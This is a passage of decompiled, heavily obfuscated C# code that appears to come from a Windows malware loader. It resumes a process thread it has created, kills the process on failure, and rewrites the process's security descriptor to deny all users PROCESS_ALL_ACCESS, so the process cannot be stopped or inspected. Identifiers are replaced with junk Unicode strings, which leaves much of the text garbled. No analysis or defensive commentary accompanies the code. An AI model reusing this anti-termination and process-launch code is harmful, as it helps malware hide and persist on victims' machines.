			if (WhatTheFuckIsThis.ResumeThread(by-unknown_uFFFD_uFFFD_uD83C_uDDE8_uFFFD_uFFFD_uD83D_uDD14_uFFFD_uD83E_uDCAB_uFFFD_uFFFD_uFFFD_uFFFD_uD83E_uDD29_uFFFD_uFFFD_u200D_uD83D_uDE1C_uFE0F_uD83E_uDE.ThreadHandle) == -1)
			{
				throw new Exception();
			}
			if (by-unknown\uD83E\uDE1C\uFFFD\uFFFD\u200D\uFFFD\uD83C\uDCA3\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\u200D\uFFFD\uD83E\uDCA3\u200D\uFFFD\uFFFD\uFE0F\uFFFD\uFE0F\uFFFD\uFFFD)
			{
				WhatTheFuckIsThis.by-unknown\uFE0F\uFE0F\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\u200D\uFFFD\uFE0F\uFFFD\uFFFD\uD83D\uDDE8\uFFFD\uFFFD\uFFFD\uFFFD\uD83E\uDFFC\uFFFD\uFFFD\uFFFD\u200D(by-unknown_uFFFD_uFFFD_uD83C_uDDE8_uFFFD_uFFFD_uD83D_uDD14_uFFFD_uD83E_uDCAB_uFFFD_uFFFD_uFFFD_uFFFD_uD83E_uDD29_uFFFD_uFFFD_u200D_uD83D_uDE1C_uFE0F_uD83E_uDE.ProcessHandle);
			}
		}
		catch
		{
			Process processById = Process.GetProcessById(Convert.ToInt32(by-unknown_uFFFD_uFFFD_uD83C_uDDE8_uFFFD_uFFFD_uD83D_uDD14_uFFFD_uD83E_uDCAB_uFFFD_uFFFD_uFFFD_uFFFD_uD83E_uDD29_uFFFD_uFFFD_u200D_uD83D_uDE1C_uFE0F_uD83E_uDE.ProcessId));
			processById.Kill();
			return false;
		}
		return true;
	}

	// Token: 0x06000011 RID: 17
	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr by-unknown\uFFFD\uD83D\uDD74\uFFFD\uD83D\uDE36\u200D\uFFFD\uFFFD\uFFFD\uD83E\uDD70\uFFFD\uFFFD\uFFFD\uD83D\uDD74\uFFFD\uFFFD\u200D\uFFFD\u200D\uFE0F\uFFFD\u26A7, int by-unknown\uFFFD\uFFFD\u200D\uFFFD\uFFFD\uD83D\uDFFC\uFFFD\uFFFD\uFFFD\uFFFD\u2642\uFFFD\uFFFD\uFFFD\uD83E\uDE23\uFFFD\uFFFD\uFFFD\u26A7\u200D\u2642\uFFFD\uFFFD, [Out] byte[] by-unknown\uFFFD\uFFFD\uFFFD\uFFFD\uFE0F\u26A7\uFFFD\u26A7\uFFFD\uFFFD\uFFFD\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uD83E\uDD75\uD83C\uDE36\uFE0F\uFFFD\uD83E\uDE1C\uFFFD, uint by-unknown\uD83D\uDE23\uFFFD\uD83E\uDEA0\uFFFD\uFFFD\uFE0F\u26A7\u200D\uFFFD\uFFFD\uD83C\uDD15\uFFFD\uFFFD\u200D\uFFFD\uFFFD\u200D\uD83E\uDC98\uD83D\uDD75\uFFFD, ref uint by-unknown\u26A7\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFE0F\u200D\uFFFD\uFFFD\uFFFD\uFFFD\uD83D\uDD14\uFFFD\uD83D\uDE33);

	// Token: 0x06000012 RID: 18
	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr by-unknown\uFFFD\u2642\uFFFD\uFFFD\uFFFD\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uD83E\uDCAB\uD83E\uDD70\uFFFD\uD83C\uDD29\uFFFD\uFFFD\uFFFD\uFE0F\uFFFD, int by-unknown\uFE0F\uFFFD\uD83D\uDFF3\u200D\uFFFD\uFFFD\uFFFD\uD83D\uDE33\uFE0F\uD83E\uDE23\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uD83D\uDE35\u200D\uD83E\uDD2D\uFFFD\uFFFD, [In] byte[] by-unknown\uD83E\uDD29\uFFFD\uFFFD\uD83C\uDFFC\uFFFD\uFFFD\u2642\uD83D\uDE36\u26A7\uFFFD\uD83D\uDE35\uFFFD\uD83E\uDE23\u200D\uFFFD\uFFFD\uFFFD\uFFFD\u200D\uFFFD);

	// Token: 0x06000013 RID: 19 RVA: 0x00002AF4 File Offset: 0x00000CF4
	private static void by-unknown\uFFFD\uFFFD\uFE0F\uFFFD\uFE0F\uFE0F\uFFFD\uFE0F\uD83E\uDD29\uFFFD\uFFFD\u200D\uD83E\uDE3F\uD83D\uDD29\uFFFD\uD83D\uDFF3\uFFFD\uD83E\uDE35\u2642\uFFFD(IntPtr by-unknown\uFFFD\uFFFD\uD83E\uDF2B\uFFFD\uFFFD\uFE0F\uFFFD\uFFFD\uD83C\uDDE8\uD83E\uDD35\uD83D\uDDE8\uFFFD\uFFFD\uFFFD\uFFFD\u2642\uFFFD\u26A7\u26A7\u200D\uFFFD, RawSecurityDescriptor by-unknown\uD83D\uDE23\uFFFD\uFFFD\u2642\uFFFD\uD83E\uDE35\uD83D\uDCA3\uFFFD\uFFFD\uFFFD\u200D\uD83E\uDD2D\uFE0F\uFFFD\uFFFD\uFFFD\uFFFD\uFE0F\uFFFD\uFFFD\uFE0F)
	{
		byte[] array = new byte[checked(by-unknown\uD83D\uDE23\uFFFD\uFFFD\u2642\uFFFD\uD83E\uDE35\uD83D\uDCA3\uFFFD\uFFFD\uFFFD\u200D\uD83E\uDD2D\uFE0F\uFFFD\uFFFD\uFFFD\uFFFD\uFE0F\uFFFD\uFFFD\uFE0F.BinaryLength - 1 + 1 - 1 + 1)];
		by-unknown\uD83D\uDE23\uFFFD\uFFFD\u2642\uFFFD\uD83E\uDE35\uD83D\uDCA3\uFFFD\uFFFD\uFFFD\u200D\uD83E\uDD2D\uFE0F\uFFFD\uFFFD\uFFFD\uFFFD\uFE0F\uFFFD\uFFFD\uFE0F.GetBinaryForm(array, 0);
		bool flag = !WhatTheFuckIsThis.SetKernelObjectSecurity(by-unknown\uFFFD\uFFFD\uD83E\uDF2B\uFFFD\uFFFD\uFE0F\uFFFD\uFFFD\uD83C\uDDE8\uD83E\uDD35\uD83D\uDDE8\uFFFD\uFFFD\uFFFD\uFFFD\u2642\uFFFD\u26A7\u26A7\u200D\uFFFD, 4, array);
		if (flag)
		{
			throw new Win32Exception();
		}
	}

	// Token: 0x06000014 RID: 20 RVA: 0x00002B3C File Offset: 0x00000D3C
	private static T by-unknown\uD83D\uDD35\uFFFD\uFFFD\uD83E\uDDE8\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\u200D\uFFFD\uFFFD\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\u26A7\uFFFD\uFFFD<T>(ref T by-unknown\uFFFD\uFFFD\u26A7\uFE0F\uFE0F\uFFFD\uD83E\uDD29\uD83E\uDE1C\uD83C\uDF2B\uFFFD\uFFFD\uD83C\uDE35\uFFFD\uFFFD\uD83E\uDEC1\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD, T by-unknown\uFFFD\uFFFD\uFFFD\uFE0F\uFE0F\uFFFD\uFE0F\uFFFD\uFFFD\uD83C\uDD35\uFFFD\uFFFD\uD83D\uDD70\uFFFD\uD83D\uDEC1\uFFFD\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFE0F)
	{
		by-unknown\uFFFD\uFFFD\u26A7\uFE0F\uFE0F\uFFFD\uD83E\uDD29\uD83E\uDE1C\uD83C\uDF2B\uFFFD\uFFFD\uD83C\uDE35\uFFFD\uFFFD\uD83E\uDEC1\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD = by-unknown\uFFFD\uFFFD\uFFFD\uFE0F\uFE0F\uFFFD\uFE0F\uFFFD\uFFFD\uD83C\uDD35\uFFFD\uFFFD\uD83D\uDD70\uFFFD\uD83D\uDEC1\uFFFD\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFE0F;
		return by-unknown\uFFFD\uFFFD\uFFFD\uFE0F\uFE0F\uFFFD\uFE0F\uFFFD\uFFFD\uD83C\uDD35\uFFFD\uFFFD\uD83D\uDD70\uFFFD\uD83D\uDEC1\uFFFD\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFE0F;
	}

	// Token: 0x06000015 RID: 21 RVA: 0x00002B58 File Offset: 0x00000D58
	private static RawSecurityDescriptor by-unknown\uFFFD\u200D\uFE0F\u200D\uD83C\uDE1C\uFFFD\uFFFD\uD83E\uDFF3\u200D\u2642\uFFFD\uD83D\uDE3F\uFE0F\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFE0F\uFFFD\u200D(IntPtr by-unknown\uFFFD\uFE0F\uFFFD\uD83D\uDC98\uFFFD\uFFFD\uD83E\uDCA3\uFFFD\uFFFD\uFFFD\uD83E\uDCAB\uFE0F\uD83D\uDCAB\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\u200D\u2642\uFFFD)
	{
		byte[] array = new byte[0];
		uint num = 0U;
		WhatTheFuckIsThis.GetKernelObjectSecurity(by-unknown\uFFFD\uFE0F\uFFFD\uD83D\uDC98\uFFFD\uFFFD\uD83E\uDCA3\uFFFD\uFFFD\uFFFD\uD83E\uDCAB\uFE0F\uD83D\uDCAB\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\u200D\u2642\uFFFD, 4, array, 0U, ref num);
		if (num < 0U || (ulong)num > 32767UL)
		{
			throw new Win32Exception();
		}
		bool flag = !WhatTheFuckIsThis.GetKernelObjectSecurity(by-unknown\uFFFD\uFE0F\uFFFD\uD83D\uDC98\uFFFD\uFFFD\uD83E\uDCA3\uFFFD\uFFFD\uFFFD\uD83E\uDCAB\uFE0F\uD83D\uDCAB\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\u200D\u2642\uFFFD, 4, WhatTheFuckIsThis.by-unknown\uD83D\uDD35\uFFFD\uFFFD\uD83E\uDDE8\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\u200D\uFFFD\uFFFD\uFFFD\uFE0F\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\u26A7\uFFFD\uFFFD<byte[]>(ref array, new byte[checked((int)(unchecked((ulong)num) - 1UL) + 1 - 1 + 1)]), num, ref num);
		if (flag)
		{
			throw new Win32Exception();
		}
		return new RawSecurityDescriptor(array, 0);
	}

	// Token: 0x06000016 RID: 22 RVA: 0x00002BE0 File Offset: 0x00000DE0
	private static void by-unknown\uFE0F\uFE0F\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\u200D\uFFFD\uFE0F\uFFFD\uFFFD\uD83D\uDDE8\uFFFD\uFFFD\uFFFD\uFFFD\uD83E\uDFFC\uFFFD\uFFFD\uFFFD\u200D(IntPtr by-unknown\uD83E\uDFFC\uFFFD\uFE0F\uFFFD\uD83D\uDFFC\uFFFD\uFFFD\uFFFD\uD83D\uDE33\uFFFD\uD83D\uDDE8\uFFFD\uFE0F\u2642\uFFFD\uD83D\uDF2B\uFFFD\uFFFD\uD83D\uDE36)
	{
		RawSecurityDescriptor rawSecurityDescriptor = WhatTheFuckIsThis.by-unknown\uFFFD\u200D\uFE0F\u200D\uD83C\uDE1C\uFFFD\uFFFD\uD83E\uDFF3\u200D\u2642\uFFFD\uD83D\uDE3F\uFE0F\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFE0F\uFFFD\u200D(by-unknown\uD83E\uDFFC\uFFFD\uFE0F\uFFFD\uD83D\uDFFC\uFFFD\uFFFD\uFFFD\uD83D\uDE33\uFFFD\uD83D\uDDE8\uFFFD\uFE0F\u2642\uFFFD\uD83D\uDF2B\uFFFD\uFFFD\uD83D\uDE36);
		rawSecurityDescriptor.DiscretionaryAcl.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 987135, new SecurityIdentifier(WellKnownSidType.WorldSid, null), false, null));
		WhatTheFuckIsThis.by-unknown\uFFFD\uFFFD\uFE0F\uFFFD\uFE0F\uFE0F\uFFFD\uFE0F\uD83E\uDD29\uFFFD\uFFFD\u200D\uD83E\uDE3F\uD83D\uDD29\uFFFD\uD83D\uDFF3\uFFFD\uD83E\uDE35\u2642\uFFFD(by-unknown\uD83E\uDFFC\uFFFD\uFE0F\uFFFD\uD83D\uDFFC\uFFFD\uFFFD\uFFFD\uD83D\uDE33\uFFFD\uD83D\uDDE8\uFFFD\uFE0F\u2642\uFFFD\uD83D\uDF2B\uFFFD\uFFFD\uD83D\uDE36, rawSecurityDescriptor);
	}

	// Token: 0x02000004 RID: 4
	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct by-unknown\uFFFD\uFFFD\uD83C\uDDE8\uFFFD\uFFFD\uD83D\uDD14\uFFFD\uD83E\uDCAB\uFFFD\uFFFD\uFFFD\uFFFD\uD83E\uDD29\uFFFD\uFFFD\u200D\uD83D\uDE1C\uFE0F\uD83E\uDE23
	{
		// Token: 0x04000001 RID: 1
		public readonly IntPtr ProcessHandle;

		// Token: 0x04000002 RID: 2
		public readonly IntPtr ThreadHandle;

		// Token: 0x04000003 RID: 3
		public readonly uint ProcessId;

		// Token: 0x04000004 RID: 4
		private readonly uint ThreadId;
	}

	// Token: 0x02000005 RID: 5
	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct by-unknown\uD83E\uDD35\uFFFD\uD83E\uDE23\u2642\uFE0F\uD83E\uDF2B\u200D\uFE0F\uFE0F\uFFFD\uD83C\uDD74\uFFFD\uFE0F\uD83D\uDFF3\uFFFD\uFFFD\uFFFD\u200D\uFFFD\uFFFD
	{
		// Token: 0x04000005 RID: 5
		public uint Size;

		// Token: 0x04000006 RID: 6
		private readonly string Reserved1;

		// Token: 0x04000007 RID: 7
		private readonly string Desktop;

		// Token: 0x04000008 RID: 8
		private readonly string Title;

		// Token: 0x04000009 RID: 9
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
		private readonly byte[] Misc;

		// Token: 0x0400000A RID: 10
		private readonly IntPtr Reserved2;

		// Token: 0x0400000B RID: 11
		private readonly IntPtr StdInput;

		// Token: 0x0400000C RID: 12
		private readonly IntPtr StdOutput;

		// Token: 0x0400000D RID: 13
		private readonly IntPtr StdError;
	}

	// Token: 0x02000006 RID: 6
	private enum by-unknown\uFFFD\uFFFD\uFE0F\uFE0F\uFFFD\uFFFD\uD83E\uDFFC\uFFFD\uFE0F\u200D\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\u200D\uFFFD\uFE0F\uFFFD\u200D\uFFFD\uFFFD\uFFFD\u200D
	{
		// Token: 0x0400000F RID: 15
		DELETE = 65536,
		// Token: 0x04000010 RID: 16
		ITE_OWNER = 524288,
		// Token: 0x04000011 RID: 17
		PROCESS_ALL_ACCESS = 987135,
		// Token: 0x04000012 RID: 18
		PROCESS_CREATE_PROCESS = 128,
		// Token: 0x04000013 RID: 19
		PROCESS_CREATE_THREAD = 2,
		// Token: 0x04000014 RID: 20
		PROCESS_DUP_HANDLE = 64,
		// Token: 0x04000015 RID: 21
		PROCESS_QUERY_INFORMATION = 1024,
		// Token: 0x04000016 RID: 22
		PROCESS_QUERY_LIMITED_INFORMATION = 4096,
		// Token: 0x04000017 RID: 23
		PROCESS_SET_INFORMATION = 512,
		// Token: 0x04000018 RID: 24
		PROCESS_SET_QUOTA = 256,
		// Token: 0x04000019 RID: 25
		PROCESS_SUSPEND_RESUME = 2048,
		// Token: 0x0400001A RID: 26
		PROCESS_TERMINATE = 1,
		// Token: 0x0400001B RID: 27
		PROCESS_VM_OPERATION = 8,
		// Token: 0x0400001C RID: 28
		PROCESS_VM_READ = 16,
		// Token: 0x0400001D RID: 29
		PROCESS_VM_WRITE = 32,
		// Token: 0x0400001E RID: 30
		READ_CONTROL = 131072,
		// Token: 0x0400001F RID: 31
		STANDARD_RIGHTS_REQUIRED = 983040,
		// Token: 0x04000020 RID: 32
		SYNCHRONIZE = 256,
		// Token: 0x04000021 RID: 33
		WRITE_DAC = 262144
	}
}
